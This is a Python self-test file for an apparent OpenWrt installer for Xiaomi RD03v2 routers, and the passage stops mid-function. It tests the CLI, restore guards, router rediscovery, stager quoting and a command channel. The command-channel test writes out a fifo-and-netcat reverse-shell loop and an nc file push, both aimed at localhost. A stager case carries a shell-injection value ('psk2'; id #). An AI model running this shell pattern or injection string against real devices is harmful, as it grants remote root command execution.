#!/usr/bin/env python3
"""Self-test for everything that does not need the router.

The parts worth testing off-hardware are the ones that would waste the
one-shot if they were wrong: the command channel's framing, the bulk
transfer, and the UBI parser that turns a raw dump into "is there a spare
kernel volume".  The channel test drives a real BusyBox `ash` over a real
socket using exactly the fifo+nc pattern the stager uses on the device, so a
framing bug shows up here rather than in the middle of a live run.

    python3 selftest.py
"""

import base64
import hashlib
import hmac
import http.server
import io
import json
import os
import shutil
import socket
import socketserver
import struct
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
import urllib.parse
from unittest import mock

import chain
import channel
import devices
import i18n
import release
import install
import probe
import restore
import ubiparse

# Assertions below are on the English text, whatever this machine's language.
os.environ["XIAOMI_INSTALL_LANG"] = "en"

REPO_ROOT = os.path.dirname(os.path.abspath(__file__))
NAND_SUPPORT_FIXTURE = os.path.join(
    REPO_ROOT, "testdata", "nand-support-v1.7.txt")

PASS, FAIL, SKIP = [], [], []


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    print(f"  [{'ok' if cond else 'FAIL'}] {name}{(' -- ' + detail) if detail else ''}")


def skip(name, detail=""):
    SKIP.append(name)
    print(f"  [skip] {name}{(' -- ' + detail) if detail else ''}")


def test_profiles():
    print("\n== device profiles ==")
    profile = devices.get_profile("rd03v2")
    check("RD03v2 is the only enabled profile",
          tuple(devices.PROFILES) == ("rd03v2",))
    good = {"hardware": "RD03v2", "model": "xiaomi.router.rd03v2",
            "romversion": "2.0.28"}
    check("validated stock identity accepted",
          devices.stock_identity_error(profile, good) is None)
    check("second validated stock ROM accepted",
          devices.stock_identity_error(
              profile, {**good, "romversion": "2.0.12"}) is None)
    check("wrong hardware rejected",
          "does not match" in devices.stock_identity_error(
              profile, {**good, "hardware": "RD23"}))
    check("untested stock ROM rejected",
          "not validated" in devices.stock_identity_error(
              profile, {**good, "romversion": "2.0.99"}))


def test_simple_installer_cli():
    import install
    print("\n== simple installer CLI ==")
    args = install.parse_args([])
    check("default command selects the latest standard release",
          args.image == "standard" and args.flavour == "default"
          and args.tag == devices.RD03V2.default_release == "latest"
          and args.stage == "all"
          and args.transport == "auto")
    args = install.parse_args(["nss", "--interface", "enx0", "--dry-run"])
    check("NSS selection maps to the NSS release family",
          args.image == "nss" and args.flavour == "nss")
    check("simple interface and dry-run options parse",
          args.discover == "enx0" and args.dry_run)
    args = install.parse_args(["--flavour", "nss", "--stage", "preflight"])
    check("advanced recovery arguments remain compatible",
          args.image == "nss" and args.stage == "preflight")

    root = tempfile.mkdtemp(prefix="xiaomi-transport-")
    try:
        os.makedirs(os.path.join(root, "eth0"))
        os.makedirs(os.path.join(root, "wlan0", "wireless"))
        check("wired interface detection",
              install.detect_transport("eth0", root) == "wired")
        check("Wi-Fi interface detection",
              install.detect_transport("wlan0", root) == "wifi")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def test_firstboot_configuration():
    import install
    print("\n== first-boot configuration ==")
    root = tempfile.mkdtemp(prefix="xiaomi-firstboot-")
    try:
        archive = os.path.join(root, "root-only.tar.gz")
        install.build_config_tar(
            archive, "", "", devices.RD03V2, pwhash="$6$testhash")
        with tarfile.open(archive) as tf:
            member = tf.getmembers()[0]
            body = tf.extractfile(member).read().decode()
        check("root-password-only archive leaves wireless untouched",
              "wireless." not in body and "/etc/shadow" in body)

        archive = os.path.join(root, "wifi.tar.gz")
        install.build_config_tar(
            archive, "ExampleNetwork", "ExamplePass123", devices.RD03V2,
            country="BR")
        with tarfile.open(archive) as tf:
            body = tf.extractfile(tf.getmembers()[0]).read().decode()
        check("Wi-Fi archive enables only explicit valid configuration",
              "ssid='ExampleNetwork'" in body and "key='ExamplePass123'" in body
              and "country='BR'" in body)

        rejected = 0
        for values in (("x" * 33, "12345678", "BR"),
                       ("ok", "short", "BR"),
                       ("ok", "pässword", "BR"),
                       ("ok", "12345678", "")):
            try:
                install.validate_firstboot_config(*values)
            except install.Abort:
                rejected += 1
        check("invalid Wi-Fi values fail before flashing", rejected == 4,
              str(rejected))
    finally:
        shutil.rmtree(root, ignore_errors=True)


def test_restore_guards():
    import restore
    print("\n== restore trust and boot environment ==")
    digest = "a" * 64
    try:
        restore.require_trusted_image(digest, None)
        check("unknown stock image fails closed", False)
    except restore.RestoreError:
        check("unknown stock image fails closed", True)
    restore.require_trusted_image(digest, None, digest)
    check("exact explicit development digest is accepted", True)
    parsed = restore.parse_env_values(
        "flag_last_success=0\nflag_boot_rootfs=0\n",
        ("flag_last_success", "flag_boot_rootfs"))
    check("boot environment parser requires exact keys",
          parsed == {"flag_last_success": "0", "flag_boot_rootfs": "0"})
    try:
        restore.parse_env_values("flag_last_success=0\n",
                                 ("flag_last_success", "flag_boot_rootfs"))
        check("missing boot environment value is refused", False)
    except restore.RestoreError:
        check("missing boot environment value is refused", True)

    original_ssh = restore.ssh
    writes = {}
    def fake_ssh(_host, command, timeout=180, check=True):
        if command.startswith("fw_setenv "):
            _cmd, key, value = command.split()
            writes[key] = value
            return 0, ""
        if command.startswith("fw_printenv "):
            return 0, "\n".join(f"{key}={writes[key]}" for key in command.split()[1:])
        return 1, "unexpected"
    try:
        restore.ssh = fake_ssh
        wanted = {"flag_last_success": 0, "flag_boot_rootfs": 0,
                  "flag_try_sys1_failed": 0, "flag_try_sys2_failed": 0,
                  "flag_boot_success": 1, "flag_ota_reboot": 0}
        got = restore.set_bootenv_verified("router", wanted)
        check("all boot-critical flags are written and verified exactly",
              got == {key: str(value) for key, value in wanted.items()})
    finally:
        restore.ssh = original_ssh


def test_resume_manifest_and_flash_guards():
    import install
    print("\n== resume manifest and permanent flash guards ==")
    root = tempfile.mkdtemp(prefix="xiaomi-resume-")
    try:
        image = os.path.join(root, "image.bin")
        open(image, "wb").write(b"image")
        args = install.parse_args(["nss", "--transport", "wired"])
        args.images = root
        args.discover = "eth0"
        args.root_password = "secret-not-persisted"
        rel = release.Release({"tag_name": "v1.11", "assets": []})
        images = {"sysupgrade": {"name": "image.bin", "path": image,
                                  "sha256": hashlib.sha256(b"image").hexdigest()}}
        path = os.path.join(root, "resume.json")
        data = install.write_resume_manifest(
            path, args, devices.RD03V2, rel, images, "token", None)
        check("resume manifest is private", (os.stat(path).st_mode & 0o777) == 0o600)
        check("resume manifest records the prepared phase",
              data["phase"] == "prepared")
        check("latest selection records a concrete release and image hashes",
              args.tag == "latest" and data["release"] == "v1.11"
              and data["images"]["sysupgrade"]["sha256"]
              == images["sysupgrade"]["sha256"])
        check("resume records password requirement without plaintext",
              data["root_password_set"] is True
              and "secret-not-persisted" not in open(path).read())
        advanced = install.update_resume_phase(path, "preflight-complete")
        check("resume phase update is atomic and persistent",
              advanced["phase"] == "preflight-complete"
              and install.load_resume_manifest(path)["phase"] == "preflight-complete")
        install.verify_resume_selection(
            data, args, devices.RD03V2, rel, images)
        check("matching resume selection is accepted", True)
        bad = dict(data)
        bad["flavour"] = "default"
        try:
            install.verify_resume_selection(
                bad, args, devices.RD03V2, rel, images)
            check("resume flavor drift is refused", False)
        except install.Abort:
            check("resume flavor drift is refused", True)

        changed = {"sysupgrade": {**images["sysupgrade"], "sha256": "0" * 64}}
        try:
            install.verify_resume_selection(
                data, args, devices.RD03V2, rel, changed)
            check("resume image hash drift is refused", False)
        except install.Abort:
            check("resume image hash drift is refused", True)

        v16 = release.Release({"tag_name": "v1.6", "assets": []})
        try:
            install.require_permanent_nand_support(
                "be", v16, devices.RD03V2, root)
            check("direct flash applies permanent NAND gate", False)
        except install.Abort:
            check("direct flash applies permanent NAND gate", True)

        mtd = ("mtd18: 02400000 00020000 \"ubi_kernel\"\n"
               "mtd19: 05180000 00020000 \"rootfs\"\n")
        check("permanent success requires overlay",
              install.permanent_system_matches(
                  devices.RD03V2, devices.RD03V2.openwrt_board, "overlay", mtd)
              and not install.permanent_system_matches(
                  devices.RD03V2, devices.RD03V2.openwrt_board, "tmpfs", mtd))
        launcher = install.build_sysupgrade_launcher("")
        check("sysupgrade waits for operator acknowledgement before execution",
              "xiaomi-sysupgrade.ack" in launcher
              and launcher.index("xiaomi-sysupgrade.ack")
              < launcher.index("exec /sbin/sysupgrade"))
        with mock.patch("socket.gethostbyname", return_value="127.0.0.42"):
            check("hostname peers normalize to numeric addresses",
                  channel.normalize_peer("router.test") == "127.0.0.42")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def test_rediscovery():
    import install
    print("\n== post-pivot rediscovery ==")
    fallback = devices.RD03V2.openwrt_host

    # Issue #4: the RAM system's DHCP made it the host's gateway, and the
    # link-local failure was swallowed -- the timeout said neither.
    with mock.patch.object(install, "default_routes",
                           return_value=[(fallback, "eth0")]), \
            mock.patch.object(install, "discover_linklocal",
                              side_effect=install.Abort(
                                  "cannot probe eth0: no ping6")), \
            mock.patch.object(install.time, "sleep"):
        try:
            install.wait_and_discover("eth0", deadline_s=0.2, fallback=fallback)
            check("rediscovery timeout explains itself", False, "no Abort")
        except install.Abort as e:
            msg = str(e)
            check("rediscovery timeout names the skipped gateway fallback",
                  f"{fallback} skipped: it is this host's default gateway "
                  "(via eth0)" in msg, msg)
            check("rediscovery timeout keeps the link-local failure",
                  "link-local: cannot probe eth0: no ping6" in msg, msg)

    with mock.patch.object(install, "default_routes", return_value=[]), \
            mock.patch.object(install.chain, "local_interface",
                              return_value="wlan0"), \
            mock.patch.object(install, "discover_linklocal",
                              return_value="fe80::1%eth0"):
        check("rediscovery returns the link-local peer",
              install.wait_and_discover("eth0", deadline_s=5,
                                        fallback=fallback) == "fe80::1%eth0")

    # A resume manifest sets args.discover; an explicit host must still win.
    args = install.parse_args(["--transport", "wired"])
    args.discover = "eth0"
    args.openwrt_host = fallback
    with mock.patch.object(install, "wait_and_discover",
                           return_value="fe80::2%eth0") as wad:
        host = install.flash_stage_host(args, devices.RD03V2, "fe80::1%eth0")
    check("explicit --openwrt-host skips rediscovery on a resumed flash",
          host == "fe80::1%eth0" and not wad.called)
    with mock.patch.object(install, "wait_and_discover",
                           return_value="fe80::2%eth0") as wad:
        host = install.flash_stage_host(args, devices.RD03V2, None)
    check("resumed flash still rediscovers without an explicit host",
          host == "fe80::2%eth0"
          and wad.call_args == mock.call("eth0", fallback=fallback,
                                         router_gateway_ok=True))


def test_router_gateway():
    import install
    import restore
    print("\n== router as this host's gateway (issue #4) ==")
    fallback = devices.RD03V2.openwrt_host
    dropbear = ("SSH-2.0-dropbear_2024.86", None)
    mac, other_mac = "aa:aa:aa:aa:aa:aa", "bb:bb:bb:bb:bb:bb"

    # ping6 is gone on some distributions; ping -6 does the same probe.
    def fake_run_for(cmds):
        def fake_run(cmd, **_kw):
            cmds.append(cmd)
            if cmd[0] == "ip":
                return mock.Mock(stdout="2: eth0    inet6 fe80::aaaa/64 "
                                        "scope link\n", stderr="")
            return mock.Mock(stdout="64 bytes from fe80::aaaa%eth0: icmp_seq=1\n"
                                    "64 bytes from fe80::2%eth0: icmp_seq=1 "
                                    "(DUP!)\n", stderr="")
        return fake_run
    for which, first in ((None, ["ping", "-6"]), ("/usr/bin/ping6", ["ping6"])):
        cmds = []
        with mock.patch.object(install.subprocess, "run",
                               side_effect=fake_run_for(cmds)), \
                mock.patch.object(install.shutil, "which", return_value=which), \
                mock.patch.object(install, "ssh_banner", return_value=dropbear):
            found = install.discover_linklocal("eth0")
        pings = [c for c in cmds if c[0] != "ip"]
        check(f"link-local probe runs {' '.join(first)} "
              f"({'ping6 present' if which else 'no ping6'})",
              found == "fe80::2%eth0" and pings
              and pings[0][:len(first)] == first, f"{found} {pings}")

    routes = [("192.168.4.1", "wlp4s0"), (fallback, "eth0")]
    with mock.patch.object(install, "default_routes", return_value=routes), \
            mock.patch.object(install.chain, "local_interface",
                              return_value="eth0"), \
            mock.patch.object(install, "ssh_banner", return_value=dropbear), \
            mock.patch.object(install, "discover_linklocal",
                              side_effect=install.Abort("none")), \
            mock.patch.object(install.time, "sleep"):
        check("the reporter's routes: the router's gateway on the cable is "
              "found when the caller opts in",
              install.wait_and_discover("eth0", deadline_s=5, fallback=fallback,
                                        router_gateway_ok=True) == fallback)
        try:
            install.wait_and_discover("eth0", deadline_s=0.2, fallback=fallback)
            check("without the opt-in the gateway is still skipped", False)
        except install.Abort as e:
            check("without the opt-in the gateway is still skipped",
                  "skipped: it is this host's default gateway (via eth0)"
                  in str(e), str(e))
        with mock.patch.object(install, "neighbour_mac",
                               return_value=other_mac):
            try:
                install.wait_and_discover("eth0", deadline_s=0.2,
                                          fallback=fallback,
                                          router_gateway_ok=True,
                                          router_mac=mac)
                check("a gateway answering from another MAC is not taken",
                      False)
            except install.Abort as e:
                check("a gateway answering from another MAC is not taken",
                      f"answers from MAC {other_mac}" in str(e), str(e))
        with mock.patch.object(install, "neighbour_mac", return_value=mac):
            check("a gateway answering from the recorded MAC is taken",
                  install.wait_and_discover(
                      "eth0", deadline_s=5, fallback=fallback,
                      router_gateway_ok=True, router_mac=mac) == fallback)

    both = [(fallback, "wlan0"), (fallback, "eth0")]
    with mock.patch.object(install, "default_routes", return_value=both), \
            mock.patch.object(install.chain, "local_interface",
                              return_value="eth0"):
        check("192.168.1.1 as gateway on another interface too is refused",
              install.gateway_conflict(fallback, "eth0")
              == "it is this host's default gateway (via wlan0)")
    with mock.patch.object(install, "default_routes",
                           return_value=[(fallback, "eth0")]), \
            mock.patch.object(install.chain, "local_interface",
                              return_value="wlan0"):
        check("a cable gateway this host reaches elsewhere is refused",
              "reaches it via wlan0" in
              (install.gateway_conflict(fallback, "eth0") or ""))

    with mock.patch.object(install, "default_routes",
                           return_value=[(fallback, "eth0")]), \
            mock.patch.object(install.chain, "local_interface",
                              return_value="eth0"), \
            mock.patch.object(install, "ssh_banner", return_value=dropbear), \
            mock.patch.object(install, "neighbour_mac", return_value=mac):
        def refused(**kw):
            try:
                install.check_is_openwrt_ram(fallback, **kw)
                return False
            except install.Abort:
                return True
        check("identity check: gateway refused without router_iface",
              refused())
        check("identity check: gateway accepted on the router cable",
              not refused(router_iface="eth0"))
        check("identity check: gateway accepted with the recorded MAC",
              not refused(router_iface="eth0", router_mac=mac))
        check("identity check: gateway refused from another MAC",
              refused(router_iface="eth0", router_mac=other_mac))
        check("identity check: a link-local is not a gateway",
              install.check_is_openwrt_ram("fe80::1%eth0") == dropbear[0])

    # The RAM stage offers only the empty password.
    tried = []

    def denied(cmd, **_kw):
        tried.append(cmd[2])
        return mock.Mock(returncode=255, stdout="",
                         stderr="root@h: Permission denied (password).")
    with mock.patch.object(install.subprocess, "run", side_effect=denied), \
            mock.patch.object(install.shutil, "which",
                              return_value="/usr/bin/sshpass"), \
            mock.patch.object(install, "SSH_PASSWORDS", ["", "secret"]):
        install.ssh("h", "true", check=False, passwords=install.RAM_PASSWORDS)
        ram_tried = list(tried)
        tried.clear()
        install.ssh("h", "true", check=False)
    check("RAM-stage ssh offers only the empty password", ram_tried == [""],
          str(ram_tried))
    check("default ssh still tries the configured password",
          tried == ["", "secret"], str(tried))

    with mock.patch.object(install, "ssh_banner", return_value=dropbear), \
            mock.patch.object(install, "check_is_openwrt_ram") as chk, \
            mock.patch.object(install, "ssh",
                              return_value=(255, "Permission denied")), \
            mock.patch.object(install.time, "sleep"):
        try:
            install.wait_for_openwrt(fallback, deadline_s=5,
                                     router_iface="eth0",
                                     passwords=install.RAM_PASSWORDS)
            check("a box refusing the empty password is not the RAM system",
                  False)
        except install.Abort as e:
            check("a box refusing the empty password is not the RAM system",
                  "refused the empty root password" in str(e)
                  and chk.call_args == mock.call(fallback,
                                                 router_iface="eth0"), str(e))

    seen = []

    def fake_ssh(_host, cmd, timeout=120, check=True, passwords=None):
        seen.append(passwords)
        if "board_name" in cmd:
            return 0, devices.RD03V2.openwrt_board
        if "rootfs_type" in cmd:
            return 0, "tmpfs"
        if "/proc/mtd" in cmd:
            return 0, ('mtd18: 02400000 00020000 "ubi_kernel"\n'
                       'mtd19: 05180000 00020000 "rootfs"\n')
        return 0, ""
    with mock.patch.object(install, "wait_for_openwrt",
                           return_value=True) as wfo, \
            mock.patch.object(install, "ssh", side_effect=fake_ssh), \
            mock.patch.object(install, "neighbour_mac", return_value=mac), \
            mock.patch.object(install, "update_resume_fields") as urf, \
            mock.patch.object(install, "require_permanent_nand_support",
                              side_effect=install.Abort("stop here")):
        try:
            install.flash(fallback, None, {}, True, devices.RD03V2, "images",
                          manifest_path="/x/resume.json", transport="wired",
                          verify_interface="eth0", router_iface="eth0")
        except install.Abort:
            pass
    check("flash identifies the RAM system on the router cable, empty "
          "password only",
          wfo.call_args == mock.call(fallback, router_iface="eth0",
                                     passwords=install.RAM_PASSWORDS))
    check("flash offers the RAM system only the empty password",
          seen and all(p == install.RAM_PASSWORDS for p in seen), str(seen))
    check("flash records the RAM system's MAC in the manifest",
          urf.call_args == mock.call("/x/resume.json", router_mac=mac))

    # Review finding #1: a MAC must still be checked once recorded, even in
    # the moment it is not *currently* read back as a default gateway (e.g. a
    # DHCP window with only a connected route so far).
    with mock.patch.object(install, "default_routes", return_value=[]), \
            mock.patch.object(install.chain, "local_interface",
                              return_value="eth0"), \
            mock.patch.object(install, "ssh_banner", return_value=dropbear), \
            mock.patch.object(install, "neighbour_mac",
                              return_value=other_mac), \
            mock.patch.object(install.time, "sleep"):
        try:
            install.wait_and_discover("eth0", deadline_s=0.2, fallback=fallback,
                                      router_gateway_ok=True, router_mac=mac)
            check("finding #1: discovery still checks the MAC outside the "
                  "gateway window", False)
        except install.Abort as e:
            check("finding #1: discovery still checks the MAC outside the "
                  "gateway window",
                  f"answers from MAC {other_mac}" in str(e), str(e))
    with mock.patch.object(install, "default_routes", return_value=[]), \
            mock.patch.object(install.chain, "local_interface",
                              return_value="eth0"), \
            mock.patch.object(install, "ssh_banner", return_value=dropbear), \
            mock.patch.object(install, "neighbour_mac",
                              return_value=other_mac):
        try:
            install.check_is_openwrt_ram(fallback, router_iface="eth0",
                                         router_mac=mac)
            check("finding #1: identity check still checks the MAC outside "
                  "the gateway window", False)
        except install.Abort as e:
            check("finding #1: identity check still checks the MAC outside "
                  "the gateway window",
                  f"answers from MAC {other_mac}" in str(e), str(e))

    # A link-local candidate is exempt: it already identifies the one device
    # on the link, so it is not bound to the RAM stage's recorded MAC.
    with mock.patch.object(install, "ssh_banner", return_value=dropbear), \
            mock.patch.object(install, "neighbour_mac") as nbr:
        result = install.check_is_openwrt_ram(
            "fe80::1%eth0", router_iface="eth0", router_mac=mac)
        check("a link-local candidate is not bound to the recorded MAC",
              result == dropbear[0] and not nbr.called)

    # Gap noted in review: the MAC can't always be read; flash() must not
    # crash, and must not teach the manifest a MAC it never confirmed.
    with mock.patch.object(install, "wait_for_openwrt", return_value=True), \
            mock.patch.object(install, "ssh", side_effect=fake_ssh), \
            mock.patch.object(install, "neighbour_mac", return_value=None), \
            mock.patch.object(install, "update_resume_fields") as urf_none, \
            mock.patch.object(install, "require_permanent_nand_support",
                              side_effect=install.Abort("stop here")):
        try:
            install.flash(fallback, None, {}, True, devices.RD03V2, "images",
                          manifest_path="/x/resume.json", transport="wired",
                          verify_interface="eth0", router_iface="eth0")
        except install.Abort:
            pass
    check("flash does not record a MAC it could not read", not urf_none.called)

    def verify_kwargs(passwords, router_mac):
        with mock.patch.object(install, "SSH_PASSWORDS", passwords), \
                mock.patch.object(install, "wait_and_discover",
                                  side_effect=install.Abort("none")) as wad, \
                mock.patch.object(install.time, "sleep"):
            try:
                install.verify_permanent_system(
                    devices.RD03V2, interface="eth0", fallback=fallback,
                    deadline_s=0.2, router_mac=router_mac)
            except install.Abort:
                pass
        kw = wad.call_args.kwargs
        return kw["router_gateway_ok"], kw["router_mac"]
    check("verification: password set, no recorded MAC -> gateway refused",
          verify_kwargs(["", "secret"], None) == (False, None))
    check("verification: password set, recorded MAC -> gateway bound to it",
          verify_kwargs(["", "secret"], mac) == (True, mac))
    check("verification: no password -> gateway accepted, no MAC needed",
          verify_kwargs([""], mac) == (True, None))

    with mock.patch.object(install, "detect_transport", return_value="wired"), \
            mock.patch.object(install, "wait_and_discover",
                              return_value=fallback) as wad, \
            mock.patch.object(install, "check_is_openwrt_ram") as chk:
        with mock.patch.object(restore, "SSH_PASSWORDS", [""]):
            host = restore.locate(None, "eth0", devices.RD03V2)
        check("restore finds the RAM system at 192.168.1.1 on a cable",
              host == fallback
              and wad.call_args.kwargs["fallback"] == fallback
              and wad.call_args.kwargs["router_gateway_ok"] is True
              and chk.call_args == mock.call(fallback, router_iface="eth0"))
        with mock.patch.object(restore, "SSH_PASSWORDS", ["", "secret"]):
            restore.locate(None, "eth0", devices.RD03V2)
        check("restore keeps refusing gateways once a password is involved",
              wad.call_args.kwargs["router_gateway_ok"] is False
              and chk.call_args == mock.call(fallback, router_iface=None))


def test_atomic_writer_scripts():
    import inspect
    import install
    import restore
    import revert
    print("\n== detached writer locks ==")
    scripts = (install.FLASH_SCRIPT, restore.RESTORE_SCRIPT, revert.PIVOT_SCRIPT)
    check("all detached writers use atomic mkdir locks",
          all("mkdir " in script and "/pid" in script for script in scripts))
    check("detached writers do not use check-then-touch locks",
          all("[ -e" not in script and ": >" not in script for script in scripts))
    pivot_source = inspect.getsource(install.pivot)
    check("install inspects writer state before staging remote inputs",
          pivot_source.index("prepare_flash_job")
          < pivot_source.index("perform_pivot_write"))


# ---- 1. stager rendering ----------------------------------------------------


def test_stager():
    print("\n== stager ==")
    cases = {
        "factory (open AP)": [],
        "wpa2 with a known key": [
            {"ifname": "wl0", "ssid": "MyNet", "encryption": "psk2",
             "password": "hunter22", "channel": "6"},
            {"ifname": "wl1", "ssid": "MyNet_5G", "encryption": "psk2",
             "password": "hunter22", "channel": "44"},
        ],
        "mixed / unknown": [
            {"ifname": "wl0", "ssid": "A", "encryption": "", "password": ""},
        ],
        # The captured values come back from the stock router over plain HTTP.
        # A legal WPA2 key may contain an apostrophe, and anything crafted must
        # not be able to close the quote and run a command as root.
        "wpa2 with an apostrophe": [
            {"ifname": "wl0", "ssid": "A", "encryption": "psk2",
             "password": "pa'ss", "channel": "6"},
        ],
        "wpa2 with spaces at the edges": [
            {"ifname": "wl0", "ssid": "A", "encryption": "psk2",
             "password": " spaced key ", "channel": "6"},
        ],
        "hostile encryption mode": [
            {"ifname": "wl0", "ssid": "A", "encryption": "psk2'; id #",
             "password": "x", "channel": "6"},
        ],
    }
    for label, restore in cases.items():
        blob = channel.build_stager(
            "192.0.2.2", 8000, 4444, restore, "testtoken")
        with tempfile.NamedTemporaryFile("wb", suffix=".sh", delete=False) as fh:
            fh.write(blob)
            path = fh.name
        for shell in (["busybox", "ash"], ["dash"]):
            if not shutil.which(shell[0]):
                continue
            r = subprocess.run(shell + ["-n", path], capture_output=True, text=True)
            check(f"{label}: {' '.join(shell)} -n", r.returncode == 0,
                  r.stderr.strip())
        os.unlink(path)

    wpa = channel.build_stager(
        "10.0.0.1", 8000, 4444, cases["wpa2 with a known key"], "testtoken")
    check("wpa2 case restores the captured cipher", b"encryption='psk2'" in wpa)

    quoted = channel.build_stager("192.0.2.2", 8000, 4444, [
        {"ifname": "wl0", "encryption": "psk2", "password": "pa'ss"}], "t")
    check("a key with an apostrophe is quoted, not left unterminated",
          b"'pa'\"'\"'ss'" in quoted, quoted.decode(errors="replace")[-400:])
    spaced = channel.build_stager("192.0.2.2", 8000, 4444, [
        {"ifname": "wl0", "encryption": "psk2", "password": " spaced key "}], "t")
    check("a key with meaningful spaces is not silently trimmed",
          b"' spaced key '" in spaced, spaced.decode(errors="replace")[-400:])
    check("wpa2 case restores the captured key", b"key='hunter22'" in wpa)
    hint = channel.expected_wifi([{"encryption": "psk2", "password": " spaced key "}])
    check("the reconnect hint does not trim a key's spaces",
          hint[0][2].endswith("key= spaced key "), str(hint))
    open_ = channel.build_stager(
        "10.0.0.1", 8000, 4444, [], "testtoken")
    check("unknown radio config falls back to an open AP",
          b"encryption='none'" in open_ and b"delete wireless.$s.key" in open_)

    exp = channel.expected_wifi(cases["wpa2 with a known key"])
    check("reconnect hint names ssid and key",
          exp[0][1] == "MyNet" and "hunter22" in exp[0][2], str(exp))


# ---- 2. command channel + bulk transfer -------------------------------------


def _fake_device(shell_port, workdir, token):
    """The device half of the stager's channel loop, verbatim in shape."""
    script = (
        f"cd {workdir}; "
        "while true; do "
        "  rm -f ch; mkfifo ch 2>/dev/null; "
        f"  {{ printf 'AUTH %s\\n' {token}; /bin/sh < ch 2>&1; }} "
        f"| busybox nc 127.0.0.1 {shell_port} > ch; "
        "  sleep 1; "
        "done"
    )
    return subprocess.Popen(["busybox", "sh", "-c", script],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            start_new_session=True)


def test_channel():
    print("\n== command channel ==")
    if not shutil.which("busybox"):
        skip("command channel", "BusyBox is not installed")
        return
    def free_port():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as probe_socket:
            probe_socket.bind(("127.0.0.1", 0))
            return probe_socket.getsockname()[1]

    sport = free_port()
    fport = free_port()
    while fport == sport:
        fport = free_port()
    workdir = tempfile.mkdtemp(prefix="rd03v2-selftest-")
    outdir = os.path.join(workdir, "out")
    os.makedirs(outdir)

    token = "selftesttoken"
    payload_size = 3 * 1024 * 1024
    ch = channel.ShellChannel("127.0.0.1", sport, token, "127.0.0.1")
    sink = channel.FileSink(
        "127.0.0.1", fport, outdir, token, "127.0.0.1",
        {"blob.bin": payload_size})
    dev = _fake_device(sport, workdir, token)
    try:
        check("device dialled in", ch.wait(timeout=20))
        if not ch.connected.is_set():
            return

        rc, out = ch.run("echo hello", quiet=True)
        check("simple command", rc == 0 and out == "hello", f"rc={rc} out={out!r}")

        with socket.create_connection(("127.0.0.1", sport), timeout=5) as rogue:
            rogue.sendall(b"AUTH wrong-token\n")
        time.sleep(0.1)
        rc, out = ch.run("echo authentic", quiet=True)
        check("unauthenticated shell cannot replace router channel",
              rc == 0 and out == "authentic")

        escaped = os.path.join(workdir, "escaped.txt")
        with socket.create_connection(("127.0.0.1", fport), timeout=5) as rogue:
            rogue.sendall(
                f"AUTH {token}\nFILE ../escaped.txt 1\nX".encode())
        time.sleep(0.1)
        check("file sink rejects traversal outside output directory",
              not os.path.exists(escaped))

        # in a subshell: `exit 7` on the channel shell itself would end the
        # session, which is exactly what the reconnect loop is for but not
        # what we are measuring here
        rc, out = ch.run("(exit 7)", quiet=True)
        check("exit code is carried back", rc == 7, f"rc={rc}")

        rc, out = ch.run("false", quiet=True)
        check("failing builtin reports rc=1", rc == 1, f"rc={rc}")

        rc, out = ch.run("ls /definitely-not-here 2>&1", quiet=True)
        check("stderr is captured", rc != 0 and "not" in out.lower(), out[:60])

        big = ch.run("i=0; while [ $i -lt 400 ]; do echo line-$i; i=$((i+1)); done",
                     quiet=True)[1]
        check("multi-KB output reassembles", big.count("\n") == 399
              and big.endswith("line-399"), f"{len(big)} B")

        rc, out = ch.run("printf 'a\\tb\\nc__MARK__d\\n'", quiet=True)
        check("payload that looks like a marker is not eaten",
              "c__MARK__d" in out, out[:60])

        # a fresh connection replaces the old one, as after a Wi-Fi bounce
        with ch.lock:
            ch.sock.close()
            ch.sock = None
            ch.connected.clear()
        rc, out = ch.run("echo back", timeout=60, quiet=True)
        check("survives a reconnect", rc == 0 and out == "back", f"rc={rc} out={out!r}")

        # bulk transfer, the same shape probe.pull() uses
        payload = os.urandom(payload_size)
        src = os.path.join(workdir, "blob.bin")
        with open(src, "wb") as fh:
            fh.write(payload)
        cmd = (f'({{ echo "AUTH {token}"; echo "FILE blob.bin {len(payload)}"; '
               f'dd if={src} bs=65536 2>/dev/null; }} '
               f'| busybox nc 127.0.0.1 {fport}) >/dev/null 2>&1 &')
        ch.run(cmd, retries=0, quiet=True)
        name, path, got, want = sink.wait(timeout=60)
        ok = path is not None and got == want == len(payload)
        check("3 MB bulk transfer", ok, f"{got}/{want}")
        if ok:
            check("bulk transfer is byte-exact",
                  hashlib.sha256(open(path, "rb").read()).digest()
                  == hashlib.sha256(payload).digest())
    finally:
        try:
            os.killpg(os.getpgid(dev.pid), 15)
        except Exception:                                        # noqa: BLE001
            dev.kill()
        shutil.rmtree(workdir, ignore_errors=True)


# ---- 3. UBI parser ----------------------------------------------------------


def _mk_ubi(peb_size=131072, vid_off=2048, data_off=4096, volumes=None,
            stale=None, image_seq=0x5A5A5A5A):
    """Synthesise a UBI image shaped like a stock kernel partition.

    volumes: list of (vol_id, name, vol_type, payload)
    """
    volumes = volumes or []
    leb = peb_size - data_off
    pebs = []

    def ec_hdr():
        h = bytearray(64)
        h[0:4] = ubiparse.EC_MAGIC
        h[4] = 1
        h[8:16] = struct.pack(">Q", 12)
        h[16:20] = struct.pack(">I", vid_off)
        h[20:24] = struct.pack(">I", data_off)
        h[24:28] = struct.pack(">I", image_seq)
        return h

    def vid_hdr(vol_id, lnum, vol_type, data_size, used_ebs, sqnum=100):
        h = bytearray(64)
        h[0:4] = ubiparse.VID_MAGIC
        h[4] = 1
        h[5] = vol_type
        h[8:12] = struct.pack(">I", vol_id)
        h[12:16] = struct.pack(">I", lnum)
        h[20:24] = struct.pack(">I", data_size)
        h[24:28] = struct.pack(">I", used_ebs)
        h[0x28:0x30] = struct.pack(">Q", sqnum)
        return h

    def peb(vid, payload):
        b = bytearray(b"\xff" * peb_size)
        b[0:64] = ec_hdr()
        if vid is not None:
            b[vid_off:vid_off + 64] = vid
        if payload:
            b[data_off:data_off + len(payload)] = payload
        return bytes(b)

    # volume table: two identical layout PEBs, as UBI keeps
    vtbl = bytearray(ubiparse.VTBL_RECORD * ubiparse.VTBL_RECORDS)
    for vol_id, name, vol_type, payload in volumes:
        rec = bytearray(ubiparse.VTBL_RECORD)
        need = (len(payload) + leb - 1) // leb
        rec[0:4] = struct.pack(">I", need + 1)
        rec[4:8] = struct.pack(">I", 1)
